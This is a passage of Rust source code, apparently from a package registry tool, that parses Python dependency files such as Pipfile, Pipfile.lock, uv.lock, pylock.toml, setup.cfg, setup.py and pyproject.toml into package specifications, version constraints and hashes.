    for (name, package) in packages {
        if let Some(requirement) = pipfile_package_requirement(&name, package, base_dir)? {
            match requirement {
                PypiProjectRequirement::Spec(spec, hashes) => {
                    if !hashes.is_empty() {
                        requirements
                            .hashes
                            .entry(spec.constraint_key())
                            .or_default()
                            .extend(hashes);
                    }
                    requirements.specs.push(spec);
                }
                PypiProjectRequirement::LocalPath(path) => {
                    requirements.python_local_paths.push(path);
                }
                PypiProjectRequirement::Vcs(vcs) => {
                    requirements.python_vcs_requirements.push(vcs);
                }
            }
        }
    }
    Ok(())
}

fn pipfile_package_requirement(
    name: &str,
    package: PipfilePackage,
    base_dir: &Path,
) -> Result<Option<PypiProjectRequirement>> {
    match package {
        PipfilePackage::Version(version) => pipfile_version_requirement(name, &version),
        PipfilePackage::Table(table) => pipfile_table_requirement(name, *table, base_dir),
    }
}

fn pipfile_version_requirement(
    name: &str,
    version: &str,
) -> Result<Option<PypiProjectRequirement>> {
    let requirement = pipfile_named_requirement(name, version, &[], None);
    Ok(
        parse_pypi_requirement_with_extras(&requirement, &BTreeSet::new())
            .map(|spec| PypiProjectRequirement::Spec(spec, BTreeSet::new())),
    )
}

fn pipfile_table_requirement(
    name: &str,
    table: PipfilePackageTable,
    base_dir: &Path,
) -> Result<Option<PypiProjectRequirement>> {
    if table
        .markers
        .as_deref()
        .map(|marker| !pypi_marker_applies(marker, &BTreeSet::new()))
        .unwrap_or(false)
    {
        return Ok(None);
    }

    if let Some(git) = table.git.as_deref() {
        let reference = python_vcs_table_reference(
            table.reference.clone(),
            table.rev.clone(),
            table.branch.clone(),
            table.tag.clone(),
        );
        let subdirectory = table.subdirectory.as_deref().map(PathBuf::from);
        let mut vcs = parse_python_vcs_requirement(
            Some((
                normalize_pypi_name(name),
                normalized_pypi_extras(table.extras),
            )),
            git,
            reference,
            true,
        )?;
        if let Some(vcs) = vcs.as_mut() {
            if vcs.subdirectory.is_none() {
                vcs.subdirectory = subdirectory;
            }
        }
        return Ok(vcs.map(PypiProjectRequirement::Vcs));
    }

    if let Some(path) = table.path.as_deref() {
        let path = resolved_local_path(path, base_dir);
        if path.is_dir() {
            return Ok(Some(PypiProjectRequirement::LocalPath(path)));
        }
        if path
            .file_name()
            .and_then(|name| name.to_str())
            .map(is_pypi_archive_filename)
            .unwrap_or(false)
        {
            let url = reqwest::Url::from_file_path(&path)
                .map_err(|_| OmcRegistryError::UnsupportedRequirement(name.to_owned()))?;
            return Ok(Some(PypiProjectRequirement::Spec(
                PackageSpec::with_direct_url(
                    Ecosystem::Pypi,
                    normalize_pypi_name(name),
                    url.to_string(),
                    normalized_pypi_extras(table.extras),
                ),
                BTreeSet::new(),
            )));
        }
        return Err(OmcRegistryError::UnsupportedRequirement(format!(
            "Pipfile local path `{}` must point to an existing directory, wheel, or sdist archive",
            path.display()
        )));
    }

    if let Some(file) = table.file.as_deref() {
        return pipfile_file_requirement(name, file, table.extras, base_dir);
    }

    let version = table.version.as_deref().unwrap_or("*");
    let requirement = pipfile_named_requirement(name, version, &table.extras, None);
    Ok(
        parse_pypi_requirement_with_extras(&requirement, &BTreeSet::new())
            .map(|spec| PypiProjectRequirement::Spec(spec, BTreeSet::new())),
    )
}

fn pipfile_file_requirement(
    name: &str,
    file: &str,
    extras: Vec<String>,
    base_dir: &Path,
) -> Result<Option<PypiProjectRequirement>> {
    let extras = normalized_pypi_extras(extras);
    if file.contains("://") {
        if !is_pypi_archive_reference(file) {
            return Err(OmcRegistryError::UnsupportedRequirement(format!(
                "Pipfile file dependency `{file}` must be a wheel or sdist archive"
            )));
        }
        return Ok(Some(PypiProjectRequirement::Spec(
            PackageSpec::with_direct_url(
                Ecosystem::Pypi,
                normalize_pypi_name(name),
                file.to_owned(),
                extras,
            ),
            BTreeSet::new(),
        )));
    }

    let path = resolved_local_path(file, base_dir);
    if !path
        .file_name()
        .and_then(|name| name.to_str())
        .map(is_pypi_archive_filename)
        .unwrap_or(false)
    {
        return Err(OmcRegistryError::UnsupportedRequirement(format!(
            "Pipfile file dependency `{}` must be a wheel or sdist archive",
            path.display()
        )));
    }
    let url = reqwest::Url::from_file_path(&path)
        .map_err(|_| OmcRegistryError::UnsupportedRequirement(file.to_owned()))?;
    Ok(Some(PypiProjectRequirement::Spec(
        PackageSpec::with_direct_url(
            Ecosystem::Pypi,
            normalize_pypi_name(name),
            url.to_string(),
            extras,
        ),
        BTreeSet::new(),
    )))
}

fn pipfile_named_requirement(
    name: &str,
    version: &str,
    extras: &[String],
    markers: Option<&str>,
) -> String {
    let extras = normalized_pypi_extras(extras.to_vec());
    let extras = if extras.is_empty() {
        String::new()
    } else {
        format!("[{}]", extras.into_iter().collect::<Vec<_>>().join(","))
    };
    let version = version.trim();
    let version = if version != "*" { version } else { "" };
    let marker = markers
        .map(str::trim)
        .filter(|marker| !marker.is_empty())
        .map(|marker| format!("; {marker}"))
        .unwrap_or_default();
    format!(
        "{}{}{}{}",
        normalize_pypi_name(name),
        extras,
        version,
        marker
    )
}

fn normalized_pypi_extras(extras: Vec<String>) -> BTreeSet<String> {
    extras
        .into_iter()
        .map(|extra| normalize_pypi_extra(&extra))
        .filter(|extra| !extra.is_empty())
        .collect()
}

fn collect_pipfile_lock_sources(
    metadata: &PipfileLockMetadata,
    requirements: &mut ProjectRequirements,
) {
    collect_pipfile_sources(&metadata.sources, requirements);
}

fn push_project_pypi_index_url(requirements: &mut ProjectRequirements, index_url: String) {
    if requirements.pypi_index_url.is_none() {
        requirements.pypi_index_url = Some(index_url);
        return;
    }

    if requirements.pypi_index_url.as_deref() == Some(index_url.as_str())
        || requirements
            .pypi_extra_index_urls
            .iter()
            .any(|extra| extra == &index_url)
    {
        return;
    }

    requirements.pypi_extra_index_urls.push(index_url);
}

fn collect_pipfile_locked_packages(
    packages: BTreeMap<String, PipfileLockedPackage>,
    base_dir: &Path,
    requirements: &mut ProjectRequirements,
) -> Result<()> {
    for (name, package) in packages {
        if package
            .markers
            .as_deref()
            .map(|marker| !pypi_marker_applies(marker, &BTreeSet::new()))
            .unwrap_or(false)
        {
            continue;
        }

        if let Some(path) = package.path.as_deref() {
            let path = resolved_local_path(path, base_dir);
            if !path.is_dir() {
                return Err(OmcRegistryError::UnsupportedRequirement(format!(
                    "Pipfile.lock local path `{}` must point to an existing directory",
                    path.display()
                )));
            }
            push_python_local_path(requirements, path);
            continue;
        }

        if let Some(git) = package.git.as_deref() {
            let reference = python_vcs_table_reference(
                package.reference.clone(),
                package.rev.clone(),
                package.branch.clone(),
                package.tag.clone(),
            );
            let subdirectory = package.subdirectory.as_deref().map(PathBuf::from);
            let mut vcs = parse_python_vcs_requirement(
                Some((
                    normalize_pypi_name(&name),
                    normalized_pypi_extras(package.extras),
                )),
                git,
                reference,
                true,
            )?
            .ok_or_else(|| OmcRegistryError::UnsupportedRequirement(name.clone()))?;
            if vcs.subdirectory.is_none() {
                vcs.subdirectory = subdirectory;
            }
            requirements.python_vcs_requirements.push(vcs);
            continue;
        }

        let name = normalize_pypi_name(&name);
        let Some(version) = package.version.as_deref().and_then(pipfile_locked_version) else {
            continue;
        };

        let extras = package
            .extras
            .into_iter()
            .map(|extra| normalize_pypi_extra(&extra))
            .filter(|extra| !extra.is_empty())
            .collect::<BTreeSet<_>>();
        requirements.specs.push(PackageSpec::with_extras(
            Ecosystem::Pypi,
            name.clone(),
            Some(version.clone()),
            extras,
        ));

        let key = format!("pypi:{name}");
        requirements.constraints.insert(key.clone(), version);
        for hash in package.hashes {
            if let Some(hash) = normalize_sha256_hash(&hash) {
                requirements
                    .hashes
                    .entry(key.clone())
                    .or_default()
                    .insert(hash);
            }
        }
    }
    Ok(())
}

fn pipfile_locked_version(version: &str) -> Option<String> {
    let version = version.trim();
    if version.is_empty() || version == "*" {
        return None;
    }
    version
        .strip_prefix("===")
        .or_else(|| version.strip_prefix("=="))
        .map(str::to_owned)
        .or_else(|| is_exact_pypi_version(version).then_some(version.to_owned()))
}

fn read_uv_lock_requirements(
    path: &Path,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let lock = toml::from_str::<UvLock>(&fs::read_to_string(path)?)?;
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    let local_sources = uv_local_sources(&lock, base_dir);
    let mut requirements = ProjectRequirements::default();
    let mut direct_specs = Vec::new();

    for package in lock.package {
        let name = normalize_pypi_name(&package.name);
        let is_registry_package = package
            .source
            .as_ref()
            .and_then(|source| source.registry.as_deref())
            .is_some();

        if is_registry_package {
            let key = format!("pypi:{name}");
            requirements
                .constraints
                .insert(key.clone(), package.version.clone());
            collect_uv_dist_hash(package.sdist.as_ref(), &key, &mut requirements);
            for wheel in &package.wheels {
                collect_uv_dist_hash(Some(wheel), &key, &mut requirements);
            }
        } else {
            let Some(metadata) = package.metadata else {
                continue;
            };
            for requirement in metadata.requires_dist {
                if let Some(requirement) = uv_dependency_requirement(
                    requirement,
                    base_dir,
                    &BTreeSet::new(),
                    &local_sources,
                )? {
                    match requirement {
                        PythonDependencyRequirement::Spec(spec) => direct_specs.push(spec),
                        PythonDependencyRequirement::LocalPath(path) => {
                            push_python_local_path(&mut requirements, path)
                        }
                    }
                }
            }

            if include_dev_dependencies {
                for requirements_for_group in metadata.requires_dev.into_values() {
                    for requirement in requirements_for_group {
                        if let Some(requirement) = uv_dependency_requirement(
                            requirement,
                            base_dir,
                            &BTreeSet::new(),
                            &local_sources,
                        )? {
                            match requirement {
                                PythonDependencyRequirement::Spec(spec) => direct_specs.push(spec),
                                PythonDependencyRequirement::LocalPath(path) => {
                                    push_python_local_path(&mut requirements, path)
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if direct_specs.is_empty() {
        requirements.specs.extend(
            requirements
                .constraints
                .iter()
                .map(|(key, version)| PackageSpec::parse(&format!("{key}@{version}")))
                .collect::<Result<Vec<_>>>()?,
        );
    } else {
        requirements.specs = direct_specs;
    }

    Ok(requirements)
}

fn push_python_local_path(requirements: &mut ProjectRequirements, path: PathBuf) {
    if !requirements.python_local_paths.contains(&path) {
        requirements.python_local_paths.push(path);
    }
}

fn uv_local_sources(lock: &UvLock, base_dir: &Path) -> BTreeMap<String, PathBuf> {
    lock.package
        .iter()
        .filter_map(|package| {
            let source = package.source.as_ref()?;
            let path = uv_source_local_path(source, base_dir);
            path.map(|path| (normalize_pypi_name(&package.name), path))
        })
        .collect()
}

fn uv_local_source_map_with_workspace(
    sources: &BTreeMap<String, UvProjectSource>,
    workspace: Option<&UvWorkspace>,
    base_dir: &Path,
) -> BTreeMap<String, PathBuf> {
    let workspace_paths = workspace
        .map(|workspace| uv_workspace_package_paths(base_dir, workspace))
        .unwrap_or_default();
    sources
        .iter()
        .filter_map(|(name, source)| {
            let name = normalize_pypi_name(name);
            if let Some(path) = source.path.as_deref() {
                return Some((name, resolved_local_path(path, base_dir)));
            }
            if source.workspace {
                if let Some(path) = workspace_paths.get(&name) {
                    return Some((name, path.clone()));
                }
            }
            None
        })
        .collect()
}

fn uv_workspace_package_paths(root: &Path, workspace: &UvWorkspace) -> BTreeMap<String, PathBuf> {
    let includes = workspace
        .members
        .iter()
        .map(String::as_str)
        .collect::<Vec<_>>();
    let excludes = workspace
        .exclude
        .iter()
        .map(String::as_str)
        .collect::<Vec<_>>();
    let mut paths = BTreeMap::new();

    for entry in WalkDir::new(root)
        .follow_links(false)
        .into_iter()
        .filter_entry(should_enter_workspace_dir)
        .filter_map(std::result::Result::ok)
    {
        if !entry.file_type().is_file() || entry.file_name() != "pyproject.toml" {
            continue;
        }

        let pyproject = entry.path();
        let Some(package_dir) = pyproject.parent() else {
            continue;
        };
        let Ok(relative_dir) = package_dir.strip_prefix(root) else {
            continue;
        };
        if !workspace_patterns_match(&includes, &excludes, relative_dir) {
            continue;
        }

        let Ok(content) = fs::read_to_string(pyproject) else {
            continue;
        };
        let Ok(pyproject) = toml::from_str::<PyProjectToml>(&content) else {
            continue;
        };
        let Some(name) = pyproject
            .project
            .and_then(|project| project.name)
            .map(|name| normalize_pypi_name(&name))
        else {
            continue;
        };
        paths.insert(name, package_dir.to_path_buf());
    }

    paths
}

fn collect_uv_dist_hash(
    dist: Option<&UvDistribution>,
    key: &str,
    requirements: &mut ProjectRequirements,
) {
    let Some(hash) = dist
        .and_then(|dist| dist.hash.as_deref())
        .and_then(normalize_sha256_hash)
    else {
        return;
    };

    requirements
        .hashes
        .entry(key.to_owned())
        .or_default()
        .insert(hash);
}

enum PythonDependencyRequirement {
    Spec(PackageSpec),
    LocalPath(PathBuf),
}

fn uv_dependency_requirement(
    requirement: UvRequirement,
    base_dir: &Path,
    active_extras: &BTreeSet<String>,
    local_sources: &BTreeMap<String, PathBuf>,
) -> Result<Option<PythonDependencyRequirement>> {
    if requirement
        .marker
        .as_deref()
        .map(|marker| !pypi_marker_applies(marker, active_extras))
        .unwrap_or(false)
    {
        return Ok(None);
    }

    if let Some(path) = uv_requirement_local_path(&requirement, base_dir)? {
        return Ok(Some(PythonDependencyRequirement::LocalPath(path)));
    }
    if let Some(path) = local_sources.get(&normalize_pypi_name(&requirement.name)) {
        if !path.is_dir() {
            return Err(OmcRegistryError::UnsupportedRequirement(format!(
                "uv local source `{}` must point to an existing directory",
                path.display()
            )));
        }
        return Ok(Some(PythonDependencyRequirement::LocalPath(path.clone())));
    }

    let mut extras = requirement.extras.into_iter().collect::<BTreeSet<_>>();
    extras.extend(requirement.extra);
    let extras = extras
        .into_iter()
        .map(|extra| normalize_pypi_extra(&extra))
        .filter(|extra| !extra.is_empty())
        .collect::<BTreeSet<_>>();

    Ok(Some(PythonDependencyRequirement::Spec(
        PackageSpec::with_extras(
            Ecosystem::Pypi,
            normalize_pypi_name(&requirement.name),
            requirement
                .specifier
                .filter(|specifier| !specifier.trim().is_empty()),
            extras,
        ),
    )))
}

fn uv_source_local_path(source: &UvPackageSource, base_dir: &Path) -> Option<PathBuf> {
    let path = source
        .editable
        .as_deref()
        .or(source.directory.as_deref())
        .or(source.path.as_deref())?;
    Some(resolved_local_path(path, base_dir))
}

fn uv_requirement_local_path(
    requirement: &UvRequirement,
    base_dir: &Path,
) -> Result<Option<PathBuf>> {
    let Some(path) = requirement
        .editable
        .as_deref()
        .or(requirement.directory.as_deref())
        .or(requirement.path.as_deref())
    else {
        return Ok(None);
    };
    uv_local_directory_path(path, base_dir)
}

fn uv_local_directory_path(path: &str, base_dir: &Path) -> Result<Option<PathBuf>> {
    let path = resolved_local_path(path, base_dir);
    if path.extension().and_then(|ext| ext.to_str()) == Some("whl") {
        return Ok(None);
    }
    if path.is_dir() {
        return Ok(Some(path));
    }
    Err(OmcRegistryError::UnsupportedRequirement(format!(
        "uv local source `{}` must point to an existing directory",
        path.display()
    )))
}

fn read_pylock_requirements(path: &Path) -> Result<ProjectRequirements> {
    let lock = toml::from_str::<PylockToml>(&fs::read_to_string(path)?)?;
    let mut requirements = ProjectRequirements::default();

    for package in lock.packages {
        if package
            .marker
            .as_deref()
            .map(|marker| !pypi_marker_applies(marker, &BTreeSet::new()))
            .unwrap_or(false)
        {
            continue;
        }

        let name = normalize_pypi_name(&package.name);
        let key = format!("pypi:{name}");
        requirements.specs.push(PackageSpec::new(
            Ecosystem::Pypi,
            name,
            Some(package.version.clone()),
        ));
        requirements
            .constraints
            .insert(key.clone(), package.version);

        collect_pylock_dist_hash(package.archive.as_ref(), &key, &mut requirements);
        collect_pylock_dist_hash(package.sdist.as_ref(), &key, &mut requirements);
        for wheel in &package.wheels {
            collect_pylock_dist_hash(Some(wheel), &key, &mut requirements);
        }
    }

    Ok(requirements)
}

fn collect_pylock_dist_hash(
    dist: Option<&PylockDistribution>,
    key: &str,
    requirements: &mut ProjectRequirements,
) {
    let Some(hash) = dist
        .and_then(|dist| dist.hashes.get("sha256"))
        .map(|hash| format!("sha256:{hash}"))
        .and_then(|hash| normalize_sha256_hash(&hash))
    else {
        return;
    };

    requirements
        .hashes
        .entry(key.to_owned())
        .or_default()
        .insert(hash);
}

fn read_setup_cfg_requirements(
    path: &Path,
    project_extras: &BTreeSet<String>,
) -> Result<ProjectRequirements> {
    let sections = parse_setup_cfg_sections(&fs::read_to_string(path)?);
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    let local_sources = BTreeMap::new();
    let mut requirements = ProjectRequirements::default();

    if let Some(options) = sections.get("options") {
        for requirement in options.get("install_requires").into_iter().flatten() {
            collect_pypi_project_requirement(
                &mut requirements,
                requirement,
                project_extras,
                base_dir,
                &local_sources,
            )?;
        }
    }

    if let Some(extras_require) = sections.get("options.extras_require") {
        for extra in project_extras {
            if let Some(requirements_for_extra) = extras_require.get(extra) {
                for requirement in requirements_for_extra {
                    collect_pypi_project_requirement(
                        &mut requirements,
                        requirement,
                        project_extras,
                        base_dir,
                        &local_sources,
                    )?;
                }
            }
        }
    }

    Ok(requirements)
}

fn parse_setup_cfg_sections(content: &str) -> BTreeMap<String, BTreeMap<String, Vec<String>>> {
    let mut sections = BTreeMap::<String, BTreeMap<String, Vec<String>>>::new();
    let mut section = String::new();
    let mut key = None::<String>;

    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.starts_with(';') {
            continue;
        }

        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            section = trimmed[1..trimmed.len() - 1].trim().to_ascii_lowercase();
            key = None;
            continue;
        }

        if section.is_empty() {
            continue;
        }

        if let Some((normalized_key, raw_value)) = setup_cfg_key_value(trimmed) {
            let normalized_key = if section == "options.extras_require" {
                normalize_pypi_extra(&normalized_key)
            } else {
                normalized_key
            };
            push_setup_cfg_value(&mut sections, &section, &normalized_key, raw_value);
            key = Some(normalized_key);
            continue;
        }

        let is_continuation = line
            .chars()
            .next()
            .map(char::is_whitespace)
            .unwrap_or(false);
        if is_continuation {
            if let Some(key) = key.as_deref() {
                push_setup_cfg_value(&mut sections, &section, key, trimmed);
            }
        }
    }

    sections
}

fn setup_cfg_key_value(trimmed: &str) -> Option<(String, &str)> {
    let (raw_key, raw_value) = trimmed.split_once('=')?;
    let raw_key = raw_key.trim();
    let raw_value = raw_value.trim();
    if raw_key.is_empty() || raw_value.starts_with('=') {
        return None;
    }
    if !raw_key
        .chars()
        .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '_' | '-' | '.'))
    {
        return None;
    }
    Some((raw_key.replace('-', "_").to_ascii_lowercase(), raw_value))
}

fn push_setup_cfg_value(
    sections: &mut BTreeMap<String, BTreeMap<String, Vec<String>>>,
    section: &str,
    key: &str,
    value: &str,
) {
    let value = value.trim();
    if value.is_empty() || value.starts_with('#') || value.starts_with(';') {
        return;
    }

    sections
        .entry(section.to_owned())
        .or_default()
        .entry(key.to_owned())
        .or_default()
        .push(value.to_owned());
}

fn read_setup_py_requirements(
    path: &Path,
    project_extras: &BTreeSet<String>,
) -> Result<ProjectRequirements> {
    let content = fs::read_to_string(path)?;
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    let local_sources = BTreeMap::new();
    let mut requirements = ProjectRequirements::default();

    for value in python_keyword_assignment_values(&content, "install_requires") {
        for requirement in python_string_literals(value) {
            collect_pypi_project_requirement(
                &mut requirements,
                &requirement,
                project_extras,
                base_dir,
                &local_sources,
            )?;
        }
    }

    for value in python_keyword_assignment_values(&content, "extras_require") {
        for requirement in python_string_dict_values(value, project_extras) {
            collect_pypi_project_requirement(
                &mut requirements,
                &requirement,
                project_extras,
                base_dir,
                &local_sources,
            )?;
        }
    }

    Ok(requirements)
}

fn root_python_project_has_metadata(project_dir: &Path) -> Result<bool> {
    let pyproject = project_dir.join("pyproject.toml");
    if pyproject.exists() && pyproject_declares_python_project(&pyproject)? {
        return Ok(true);
    }

    let setup_cfg = project_dir.join("setup.cfg");
    if setup_cfg.exists() && setup_cfg_declares_python_project(&setup_cfg)? {
        return Ok(true);
    }

    let setup_py = project_dir.join("setup.py");
    if setup_py.exists() && setup_py_declares_python_project(&setup_py)? {
        return Ok(true);
    }

    Ok(false)
}

fn pyproject_declares_python_project(path: &Path) -> Result<bool> {
    let pyproject = toml::from_str::<PyProjectToml>(&fs::read_to_string(path)?)?;
    if let Some(project) = pyproject.project {
        if project.name.is_some() || !project.scripts.is_empty() || !project.gui_scripts.is_empty()
        {
            return Ok(true);
        }
    }
    if let Some(poetry) = pyproject.tool.and_then(|tool| tool.poetry) {
        if poetry.name.is_some() || !poetry.scripts.is_empty() {
            return Ok(true);
        }
    }
    Ok(false)
}

fn setup_cfg_declares_python_project(path: &Path) -> Result<bool> {
    let sections = parse_setup_cfg_sections(&fs::read_to_string(path)?);
    let has_name = sections
        .get("metadata")
        .and_then(|metadata| metadata.get("name"))
        .map(|values| values.iter().any(|value| !value.trim().is_empty()))
        .unwrap_or(false);
    let has_entry_points = sections
        .get("options.entry_points")
        .map(|entry_points| {
            entry_points
                .keys()
                .any(|key| matches!(key.as_str(), "console_scripts" | "gui_scripts"))
        })
        .unwrap_or(false);
    Ok(has_name || has_entry_points)
}

fn setup_py_declares_python_project(path: &Path) -> Result<bool> {
    let content = fs::read_to_string(path)?;
    Ok(content.contains("setup("))
}

fn python_keyword_assignment_values<'a>(content: &'a str, keyword: &str) -> Vec<&'a str> {
    let mut values = Vec::new();
    let bytes = content.as_bytes();
    let keyword = keyword.as_bytes();
    let mut index = 0;

    while index + keyword.len() <= bytes.len() {
        if bytes[index] == b'#' {
            index = skip_python_comment(content, index);
            continue;
        }
        if let Some(token) = python_string_literal_at(content, index) {
            index = token.end;
            continue;
        }
        if !bytes[index..].starts_with(keyword)
            || index
                .checked_sub(1)
                .map(|previous| python_identifier_char(bytes[previous]))
                .unwrap_or(false)
            || bytes
                .get(index + keyword.len())
                .copied()
                .map(python_identifier_char)
                .unwrap_or(false)
        {
            index += 1;
            continue;
        }

        let mut value_start = skip_python_ws_and_comments(content, index + keyword.len());
        if bytes.get(value_start) != Some(&b'=') {
            index += keyword.len();
            continue;
        }
        value_start = skip_python_ws_and_comments(content, value_start + 1);

        let Some(value_end) = python_literal_value_end(content, value_start) else {
            index += keyword.len();
            continue;
        };
        values.push(&content[value_start..value_end]);
        index = value_end;
    }

    values
}

fn python_literal_value_end(content: &str, start: usize) -> Option<usize> {
    let byte = *content.as_bytes().get(start)?;
    if matches!(byte, b'[' | b'(' | b'{') {
        return python_balanced_literal_end(content, start);
    }
    python_string_literal_at(content, start).map(|token| token.end)
}

fn python_balanced_literal_end(content: &str, start: usize) -> Option<usize> {
    let bytes = content.as_bytes();
    let mut stack = Vec::new();
    stack.push(python_matching_close(*bytes.get(start)?)?);
    let mut index = start + 1;

    while index < bytes.len() {
        let byte = bytes[index];
        if byte == b'#' {
            index = skip_python_comment(content, index);
            continue;
        }
        if let Some(token) = python_string_literal_at(content, index) {
            index = token.end;
            continue;
        }
        if let Some(close) = python_matching_close(byte) {
            stack.push(close);
            index += 1;
            continue;
        }
        if stack.last().copied() == Some(byte) {
            stack.pop();
            index += 1;
            if stack.is_empty() {
                return Some(index);
            }
            continue;
        }
        index += 1;
    }

    None
}

fn python_matching_close(open: u8) -> Option<u8> {
    match open {
        b'[' => Some(b']'),
        b'(' => Some(b')'),
        b'{' => Some(b'}'),
        _ => None,
    }
}

fn python_string_literals(content: &str) -> Vec<String> {
    let mut values = Vec::new();
    let bytes = content.as_bytes();
    let mut index = 0;

    while index < bytes.len() {
        if bytes[index] == b'#' {
            index = skip_python_comment(content, index);
            continue;
        }
        if let Some(token) = python_string_literal_at(content, index) {
            if let Some(value) = token.value {
                values.push(value);
            }
            index = token.end;
        } else {
            index += 1;
        }
    }

    values
}

fn python_string_dict_values(content: &str, selected_keys: &BTreeSet<String>) -> Vec<String> {
    let mut values = Vec::new();
    let bytes = content.as_bytes();
    if bytes.first() != Some(&b'{') {
        return values;
    }

    let mut index = 1;
    while index < bytes.len() {
        index = skip_python_ws_and_comments(content, index);
        if bytes.get(index) == Some(&b'}') {
            break;
        }
        if bytes.get(index) == Some(&b',') {
            index += 1;
            continue;
        }

        let Some(key_token) = python_string_literal_at(content, index) else {
            index += 1;
            continue;
        };
        let Some(key) = key_token.value else {
            index = key_token.end;
            continue;
        };
        index = skip_python_ws_and_comments(content, key_token.end);
        if bytes.get(index) != Some(&b':') {
            continue;
        }
        index = skip_python_ws_and_comments(content, index + 1);
        let Some(value_end) = python_literal_value_end(content, index) else {
            continue;
        };
        if selected_keys.contains(&normalize_pypi_extra(&key)) {
            values.extend(python_string_literals(&content[index..value_end]));
        }
        index = value_end;
    }

    values
}

struct PythonStringToken {
    value: Option<String>,
    end: usize,
}

fn python_string_literal_at(content: &str, start: usize) -> Option<PythonStringToken> {
    let bytes = content.as_bytes();
    let mut quote_index = start;
    let mut dynamic_or_bytes = false;

    while let Some(byte) = bytes.get(quote_index).copied() {
        if matches!(byte, b'\'' | b'"') {
            break;
        }
        if matches!(byte, b'r' | b'R' | b'u' | b'U' | b'b' | b'B' | b'f' | b'F') {
            dynamic_or_bytes |= matches!(byte, b'b' | b'B' | b'f' | b'F');
            quote_index += 1;
            continue;
        }
        return None;
    }

    let quote = *bytes.get(quote_index)?;
    if !matches!(quote, b'\'' | b'"') {
        return None;
    }

    let triple =
        bytes.get(quote_index + 1) == Some(&quote) && bytes.get(quote_index + 2) == Some(&quote);
    let mut index = quote_index + if triple { 3 } else { 1 };
    let value_start = index;

    while index < bytes.len() {
        if !triple && bytes[index] == b'\\' {
            index = index.saturating_add(2);
            continue;
        }
        if triple {
            if bytes[index] == quote
                && bytes.get(index + 1) == Some(&quote)
                && bytes.get(index + 2) == Some(&quote)
            {
                let raw = &content[value_start..index];
                return Some(PythonStringToken {
                    value: (!dynamic_or_bytes).then(|| unescape_python_string(raw)),
                    end: index + 3,
                });
            }
            index += 1;
            continue;
        }
        if bytes[index] == quote {
            let raw = &content[value_start..index];
            return Some(PythonStringToken {
                value: (!dynamic_or_bytes).then(|| unescape_python_string(raw)),
                end: index + 1,
            });
        }
        index += 1;
    }

    None
}

fn unescape_python_string(raw: &str) -> String {
    let mut output = String::new();
    let mut chars = raw.chars();
    while let Some(ch) = chars.next() {
        if ch != '\\' {
            output.push(ch);
            continue;
        }
        match chars.next() {
            Some('n') => output.push('\n'),
            Some('r') => output.push('\r'),
            Some('t') => output.push('\t'),
            Some('\\') => output.push('\\'),
            Some('\'') => output.push('\''),
            Some('"') => output.push('"'),
            Some(other) => {
                output.push('\\');
                output.push(other);
            }
            None => output.push('\\'),
        }
    }
    output
}

fn skip_python_ws_and_comments(content: &str, mut index: usize) -> usize {
    let bytes = content.as_bytes();
    while index < bytes.len() {
        if bytes[index].is_ascii_whitespace() {
            index += 1;
            continue;
        }
        if bytes[index] == b'#' {
            index = skip_python_comment(content, index);
            continue;
        }
        break;
    }
    index
}

fn skip_python_comment(content: &str, mut index: usize) -> usize {
    let bytes = content.as_bytes();
    while index < bytes.len() && bytes[index] != b'\n' {
        index += 1;
    }
    index
}

fn python_identifier_char(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'_'
}

fn read_pyproject_requirements(
    path: &Path,
    project_extras: &BTreeSet<String>,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let pyproject = toml::from_str::<PyProjectToml>(&fs::read_to_string(path)?)?;
    let mut discovered = ProjectRequirements::default();
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    let uv_sources = pyproject
        .tool
        .as_ref()
        .and_then(|tool| tool.uv.as_ref())
        .map(|uv| uv_local_source_map_with_workspace(&uv.sources, uv.workspace.as_ref(), base_dir))
        .unwrap_or_default();

    if let Some(project) = pyproject.project {
        for dependency in project.dependencies {
            collect_pypi_project_requirement(
                &mut discovered,
                &dependency,
                &BTreeSet::new(),
                base_dir,
                &uv_sources,
            )?;
        }

        let optional_dependencies = project
            .optional_dependencies
            .into_iter()
            .map(|(extra, dependencies)| (normalize_pypi_extra(&extra), dependencies))
            .collect::<BTreeMap<_, _>>();

        for extra in project_extras {
            if let Some(dependencies) = optional_dependencies.get(extra) {
                for dependency in dependencies {
                    collect_pypi_project_requirement(
                        &mut discovered,
                        dependency,
                        project_extras,
                        base_dir,
                        &uv_sources,
                    )?;
                }
            }
        }
    }

    let group_requirements = read_pyproject_dependency_groups(
        pyproject.dependency_groups,
        project_extras,
        include_dev_dependencies,
        base_dir,
        &uv_sources,
    )?;
    extend_project_requirements(&mut discovered, group_requirements);

    if let Some(poetry) = pyproject.tool.and_then(|tool| tool.poetry) {
        collect_poetry_sources(&poetry.source, &mut discovered);

        let poetry_requirements = read_poetry_dependencies(
            &poetry.dependencies,
            &poetry.extras,
            project_extras,
            base_dir,
        )?;
        extend_project_requirements(&mut discovered, poetry_requirements);

        if include_dev_dependencies {
            let poetry_requirements = read_poetry_dependencies(
                &poetry.dev_dependencies,
                &BTreeMap::new(),
                &BTreeSet::new(),
                base_dir,
            )?;
            extend_project_requirements(&mut discovered, poetry_requirements);
        }

        for (group_name, group) in poetry.group {
            let group_name = normalize_pypi_extra(&group_name);
            let include_group = if group_name == "dev" {
                include_dev_dependencies
            } else if group.optional {
                project_extras.contains(&group_name)
            } else {
                true
            };

            if include_group {
                let poetry_requirements = read_poetry_dependencies(
                    &group.dependencies,
                    &BTreeMap::new(),
                    &BTreeSet::new(),
                    base_dir,
                )?;
                extend_project_requirements(&mut discovered, poetry_requirements);
            }
        }
    }

    Ok(discovered)
}

fn read_pyproject_dependency_groups(
    dependency_groups: BTreeMap<String, Vec<PyProjectDependencyGroupItem>>,
    project_extras: &BTreeSet<String>,
    include_dev_dependencies: bool,
    base_dir: &Path,
    local_sources: &BTreeMap<String, PathBuf>,
) -> Result<ProjectRequirements> {
    let dependency_groups = dependency_groups
        .into_iter()
        .map(|(name, items)| (normalize_pypi_extra(&name), items))
